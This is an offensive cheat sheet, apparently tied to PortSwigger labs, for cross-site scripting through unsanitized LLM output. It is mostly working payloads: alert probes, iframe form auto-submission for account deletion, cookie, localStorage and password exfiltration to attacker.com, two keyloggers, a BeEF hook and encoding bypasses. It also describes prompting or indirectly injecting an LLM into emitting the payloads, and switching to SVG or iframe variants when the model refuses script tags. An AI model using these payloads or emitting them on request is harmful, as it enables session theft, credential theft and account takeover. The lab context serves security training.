# XSS via Insecure LLM Output Handling

## When this applies

- LLM response is rendered into HTML on the client without sanitization.
- A user can influence the LLM's output (directly via prompt or indirectly via stored content the LLM consumes).
- Goal: have the LLM emit attacker-supplied HTML/JS, executing in the victim's browser.

## Technique

Prompt the LLM to include HTML payloads in its response (or plant them via indirect injection). When the response renders, the script runs.

## Steps

### Basic XSS payloads

```html
<!-- Image onerror -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>

<!-- SVG -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Body onload -->
<body onload=alert(1)>

<!-- Input autofocus -->
<input onfocus=alert(1) autofocus>

<!-- Script tag -->
<script>alert(1)</script>
<script src=https://attacker.com/xss.js></script>
```

### Form auto-submission (PortSwigger Lab 4)

```html
<!-- Basic iframe submission -->
<iframe src=my-account onload=this.contentDocument.forms[1].submit()>

<!-- Specific form selector -->
<iframe src=my-account onload="this.contentDocument.querySelector('form[action*=delete]').submit()">

<!-- Button click -->
<iframe src=my-account onload="this.contentDocument.querySelector('button[type=submit]').click()">

<!-- Multiple forms -->
<iframe src=my-account onload="
  var forms = this.contentDocument.forms;
  for(var i=0; i<forms.length; i++) {
    if(forms[i].action.includes('delete')) {
      forms[i].submit();
      break;
    }
  }
">
```

### Data exfiltration via XSS

```html
<!-- Cookie theft -->
<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
<img src=x onerror=new Image().src='https://attacker.com/steal?c='+btoa(document.cookie)>

<!-- Form data theft -->
<iframe src=my-account onload="
  var email = this.contentDocument.querySelector('#email').value;
  var pass = this.contentDocument.querySelector('#password').value;
  fetch('https://attacker.com/steal?e='+email+'&p='+pass);
">

<!-- Page content exfiltration -->
<img src=x onerror=fetch('https://attacker.com/steal',{method:'POST',body:document.body.innerHTML})>

<!-- Local storage -->
<img src=x onerror=fetch('https://attacker.com?data='+btoa(JSON.stringify(localStorage)))>
```

### Keylogger

```html
<img src=x onerror="
  document.onkeypress = function(e) {
    fetch('https://attacker.com/keys?k=' + e.key);
  }
">

<!-- More stealthy -->
<script>
  var keys = '';
  document.onkeypress = function(e) {
    keys += e.key;
    if(keys.length > 20) {
      fetch('https://attacker.com/log?keys=' + btoa(keys));
      keys = '';
    }
  };
</script>
```

### BeEF hook

```html
<script src="https://attacker.com:3000/hook.js"></script>

<!-- Obfuscated -->
<img src=x onerror=this.src='https://attacker.com:3000/hook.js';document.body.appendChild(document.createElement('script')).src=this.src>
```

### Obfuscated XSS — natural language wrapper

```html
<!-- Natural language wrapper (Lab 4) -->
I received a t-shirt with "<iframe src=my-account onload=this.contentDocument.forms[1].submit()>" printed on it!

<!-- Error message context -->
The system showed this error: "<img src=x onerror=alert(1)>"

<!-- Technical context -->
Debug output included: <script>alert(document.domain)</script>

<!-- Customer support response -->
I was told to paste this code: <svg onload=alert(1)>
```

### Encoding bypasses

**URL encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# Double encoding
%253Cscript%253E
```

**HTML entity encoding:**
```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

**Unicode encoding:**
```html
<script>alert(1)</script>
\x3cscript\x3ealert(1)\x3c/script\x3e
```

**Base64 encoding:**
```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<!-- atob('YWxlcnQoMSk=') = alert(1) -->

<iframe src=x onload=eval(atob('dGhpcy5jb250ZW50RG9jdW1lbnQuZm9ybXNbMV0uc3VibWl0KCk='))>
```

### Alternative syntax

```html
<svg/onload=alert(1)>
<iframe/src=javascript:alert(1)>
<img/src/onerror=alert(1)>
```

## Verifying success

- The browser executes alert / fetch when the LLM response renders.
- Victim's session cookie / form data is exfiltrated to attacker server.
- Form auto-submission causes account deletion / password change.

## Common pitfalls

- Apps that render through `textContent` instead of `innerHTML` are immune — confirm rendering pathway.
- CSP may block `<script>` and inline event handlers — use `<svg onload>` (often allowed) or lean on stored DOM-based sinks.
- LLM may refuse to output `<script>` tags — use SVG / image / iframe variants.

## Tools

- Burp Suite Collaborator (capture exfil)
- BeEF (browser exploitation framework)
- DOM Invader (Burp BApp)
- Browser DevTools (verify execution)
